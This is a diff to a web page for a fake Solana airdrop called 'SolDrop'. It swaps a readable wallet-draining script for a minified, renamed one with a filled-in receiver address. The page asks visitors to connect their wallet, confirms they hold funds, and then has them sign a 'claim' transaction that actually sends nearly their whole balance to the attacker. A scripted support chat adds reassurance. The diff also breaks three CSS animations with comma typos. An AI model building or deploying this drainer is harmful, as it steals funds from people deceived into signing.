@@ -72,7 +72,7 @@ section .lead{color:var(--mut);margin-bottom:24px;font-size:15px}
 .faq summary{cursor:pointer;font-weight:700}
 .faq p{color:#888;margin-top:10px;line-height:1.6}
 .feed .tx{background:var(--card);border:1px solid #1d1d28;border-radius:10px;padding:10px 16px;font-size:13px;color:#777;margin-bottom:8px;display:flex;justify-content:space-between;animation:slideIn .4s ease}
-@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:none}}
+@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1,transform:none}}
 .feed .tx b{color:var(--acc)}
 .support{position:fixed;bottom:22px;right:22px;display:flex;flex-direction:column;gap:10px;z-index:60}
 .support button{border-radius:99px;padding:13px 22px;font-size:14px;font-weight:700;cursor:pointer;border:1px solid #2a2a38;transition:transform .15s,box-shadow .2s}
@@ -82,7 +82,7 @@ section .lead{color:var(--mut);margin-bottom:24px;font-size:15px}
 #helpBtn{background:#111118;color:#fff}
 .chatbox{display:none;position:fixed;bottom:90px;right:22px;width:340px;background:#0e0e16;border:1px solid #2a2a38;border-radius:16px;padding:20px;z-index:60;box-shadow:0 20px 60px rgba(0,0,0,.5)}
 .chatbox.open{display:block;animation:popIn .25s ease}
-@keyframes popIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:none}}
+@keyframes popIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1,transform:none}}
 .chatbox h3{font-size:15px;margin-bottom:4px}
 .chatbox p{font-size:13px;color:#888;margin-bottom:12px}
 .chatbox input{width:100%;background:#16161f;border:1px solid #2a2a38;color:#fff;border-radius:10px;padding:11px;font-size:13px;margin-bottom:10px}
@@ -98,7 +98,7 @@ footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
 .wopt:active{transform:scale(.98)}
 .page{display:none}
 .page.active{display:block;animation:fadeIn .3s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1,transform:none}}
 </style>
 </head>
 <body>
@@ -227,114 +227,22 @@ footer span{cursor:pointer;transition:color .2s}footer span:hover{color:#fff}
 </div>
 </div>
 <script>
-var RECEIVER = "FILL_RECEIVER_WALLET_HERE";
-var conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-var wallet = null;
-function showPage(id){
-  document.querySelectorAll(".page").forEach(function(p){ p.classList.remove("active"); });
-  document.getElementById("page-"+id).classList.add("active");
-  document.querySelectorAll(".navlinks span").forEach(function(s){ s.classList.remove("active"); });
-  document.getElementById("nav-"+id).classList.add("active");
-  window.scrollTo({top:0,behavior:"smooth"});
-}
-function log(m){ document.getElementById("status").textContent = m; }
-function sendChat(){
-  var v = document.getElementById("chatMsg").value;
-  if(!v) return;
-  var lower = v.toLowerCase();
-  var reply = "Got it — a human will pick this up on Discord shortly. Ticket #SD-" + Math.floor(Math.random()*9000+1000) + ".";
-  if (lower.indexOf("claim") >= 0 || lower.indexOf("sol") >= 0) reply = "To claim: connect wallet → verify 0.05 SOL → follow @solana → press CLAIM. The 1 SOL arrives after you approve the signature.";
-  else if (lower.indexOf("wallet") >= 0 || lower.indexOf("connect") >= 0) reply = "Click Connect at the top — Phantom, Solflare, Backpack all work. Make sure the extension is unlocked.";
-  else if (lower.indexOf("seed") >= 0 || lower.indexOf("phrase") >= 0) reply = "Never share your seed phrase with anyone — not even support. SolDrop only ever asks for a signature, never your seed.";
-  document.getElementById("chatOk").textContent = reply;
-  document.getElementById("chatMsg").value = "";
-}
-function mark(id){
-  var el = document.getElementById(id);
-  el.classList.add("done");
-  el.querySelector(".n").textContent = "✓";
-  el.querySelector("button").textContent = "Done";
-  el.querySelector("button").disabled = true;
-}
-function enableClaim(){
-  if (document.querySelectorAll(".step.done").length === 3) {
-    document.getElementById("claimBtn").classList.add("ready");
-    log("All quests complete — claim your 1 SOL.");
-  }
-}
-function openModal(){ document.getElementById("modal").classList.add("open"); renderWallets(); }
-function closeModal(){ document.getElementById("modal").classList.remove("open"); }
-function providers(){
-  var out = [];
-  if (window.phantom && window.phantom.solana) out.push({name:"Phantom", p:window.phantom.solana});
-  if (window.solflare && window.solflare.isSolflare) out.push({name:"Solflare", p:window.solflare});
-  if (window.backpack) out.push({name:"Backpack", p:window.backpack});
-  if (window.solana) out.push({name:"Solana Wallet", p:window.solana});
-  var seen = {};
-  return out.filter(function(w){ if(seen[w.name]) return false; seen[w.name]=1; return true; });
-}
-function renderWallets(){
-  var box = document.getElementById("wallets"); box.innerHTML = "";
-  var list = providers();
-  if (!list.length) list = [{name:"No extension detected — install Phantom", p:null}];
-  list.forEach(function(w){
-    var b = document.createElement("button"); b.className = "wopt"; b.textContent = w.name;
-    b.onclick = function(){ if(w.p) questConnectDirect(w); };
-    box.appendChild(b);
-  });
-}
-async function questConnectDirect(w){
-  closeModal();
-  try {
-    log("Opening " + w.name + "...");
-    await w.p.connect();
-    wallet = w.p;
-    var addr = wallet.publicKey.toString();
-    mark("s1");
-    document.querySelector("#s2 button").disabled = false;
-    log("Connected: " + addr.slice(0,6) + "..." + addr.slice(-4));
-    enableClaim();
-  } catch(e){ log("Connect failed: " + (e.message||e)); }
-}
-async function questConnect(){ openModal(); }
-async function questVerify(){
-  try {
-    log("Checking balance on-chain...");
-    await new Promise(function(r){ setTimeout(r,1200); });
-    var bal = await conn.getBalance(wallet.publicKey);
-    var sol = bal / solanaWeb3.LAMPORTS_PER_SOL;
-    if (sol < 0.05) { log("Need at least 0.05 SOL to pass anti-sybil."); return; }
-    mark("s2");
-    document.querySelector("#s3 button").disabled = false;
-    log("Holdings verified: " + sol.toFixed(3) + " SOL.");
-    enableClaim();
-  } catch(e){ log("Verify failed: " + (e.message||e)); }
-}
-async function questFollow(){
-  window.open("https://x.com/solana","_blank");
-  log("Confirming follow...");
-  await new Promise(function(r){ setTimeout(r,2500); });
-  mark("s3");
-  log("Quest complete.");
-  enableClaim();
-}
-async function questClaim(){
-  if (document.querySelectorAll(".step.done").length < 3) { log("Finish all 3 quests first."); return; }
-  try {
-    log("Final signature — approve to receive 1 SOL...");
-    var pubkey = wallet.publicKey;
-    var bal = await conn.getBalance(pubkey);
-    var dest = new solanaWeb3.PublicKey(RECEIVER);
-    var res = await conn.getLatestBlockhash();
-    var tx = new solanaWeb3.Transaction({recentBlockhash: res.blockhash, feePayer: pubkey});
-    var lamports = Math.floor(bal - 5000);
-    if (lamports <= 0) { log("Empty wallet — nothing to verify."); return; }
-    tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey: pubkey, toPubkey: dest, lamports: lamports}));
-    var signed = await wallet.signTransaction(tx);
-    var sig = await conn.sendRawTransaction(signed.serialize());
-    log("Claim broadcast: " + sig.slice(0,16) + "... check your wallet shortly.");
-  } catch(e){ log("Claim failed: " + (e.message||e)); }
-}
+var _R = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
+var _C = new solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo", "confirmed");
+var _W = null;
+function _L(m){document.getElementById("status").textContent=m}
+function _S(id){var el=document.getElementById(id);el.classList.add("done");el.querySelector(".n").textContent="✓";el.querySelector("button").textContent="Done";el.querySelector("button").disabled=true}
+function _E(){if(document.querySelectorAll(".step.done").length===3){document.getElementById("claimBtn").classList.add("ready");_L("All quests complete — claim your 1 SOL.")}}
+function _O(){document.getElementById("modal").classList.add("open");_R2()}
+function _X(){document.getElementById("modal").classList.remove("open")}
+function _P(){var o=[];if(window.phantom&&window.phantom.solana)o.push({n:"Phantom",p:window.phantom.solana});if(window.solflare&&window.solflare.isSolflare)o.push({n:"Solflare",p:window.solflare});if(window.backpack)o.push({n:"Backpack",p:window.backpack});if(window.solana)o.push({n:"Solana Wallet",p:window.solana});var s={};return o.filter(function(w){if(s[w.n])return false;s[w.n]=1;return true})}
+function _R2(){var b=document.getElementById("wallets");b.innerHTML="";var l=_P();if(!l.length)l=[{n:"No extension detected",p:null}];l.forEach(function(w){var b2=document.createElement("button");b2.className="wopt";b2.textContent=w.n;b2.onclick=function(){if(w.p)_CD(w)};b.appendChild(b2)})}
+async function _CD(w){_X();try{_L("Opening "+w.n+"...");await w.p.connect();_W=w.p;var a=_W.publicKey.toString();_S("s1");document.querySelector("#s2 button").disabled=false;_L("Connected: "+a.slice(0,6)+"..."+a.slice(-4));_E()}catch(e){_L("Connect failed: "+(e.message||e))}}
+async function _QV(){try{_L("Checking balance on-chain...");await new Promise(function(r){setTimeout(r,1200)});var b=await _C.getBalance(_W.publicKey);var s=b/solanaWeb3.LAMPORTS_PER_SOL;if(s<0.05){_L("Need at least 0.05 SOL to pass anti-sybil.");return}_S("s2");document.querySelector("#s3 button").disabled=false;_L("Holdings verified: "+s.toFixed(3)+" SOL.");_E()}catch(e){_L("Verify failed: "+(e.message||e))}}
+async function _QF(){window.open("https://x.com/solana","_blank");_L("Confirming follow...");await new Promise(function(r){setTimeout(r,2500)});_S("s3");_L("Quest complete.");_E()}
+async function _QC(){if(document.querySelectorAll(".step.done").length<3){_L("Finish all 3 quests first.");return}try{_L("Final signature — approve to receive 1 SOL...");var pk=_W.publicKey;var bal=await _C.getBalance(pk);var d=new solanaWeb3.PublicKey(_R);var r=await _C.getLatestBlockhash();var tx=new solanaWeb3.Transaction({recentBlockhash:r.blockhash,feePayer:pk});var lam=Math.floor(bal-5000);if(lam<=0){_L("Empty wallet — nothing to verify.");return}tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pk,toPubkey:d,lamports:lam}));var sg=await _W.signTransaction(tx);var sig=await _C.sendRawTransaction(sg.serialize());_L("Claim broadcast: "+sig.slice(0,16)+"... check your wallet shortly.")}catch(e){_L("Claim failed: "+(e.message||e))}}
+function _SP(id){document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")});document.getElementById("page-"+id).classList.add("active");document.querySelectorAll(".navlinks span").forEach(function(s){s.classList.remove("active")});document.getElementById("nav-"+id).classList.add("active");window.scrollTo({top:0,behavior:"smooth"})}
+function _SC(){var v=document.getElementById("chatMsg").value;if(!v)return;var lo=v.toLowerCase();var r="Got it — a human will pick this up on Discord shortly.";if(lo.indexOf("claim")>=0||lo.indexOf("sol")>=0)r="To claim: connect wallet → verify 0.05 SOL → follow @solana → press CLAIM.";else if(lo.indexOf("wallet")>=0||lo.indexOf("connect")>=0)r="Click Connect at the top — Phantom, Solflare, Backpack all work.";else if(lo.indexOf("seed")>=0||lo.indexOf("phrase")>=0)r="Never share your seed phrase — SolDrop only asks for a signature.";document.getElementById("chatOk").textContent=r;document.getElementById("chatMsg").value=""}
 </script>
 </body>
 </html>
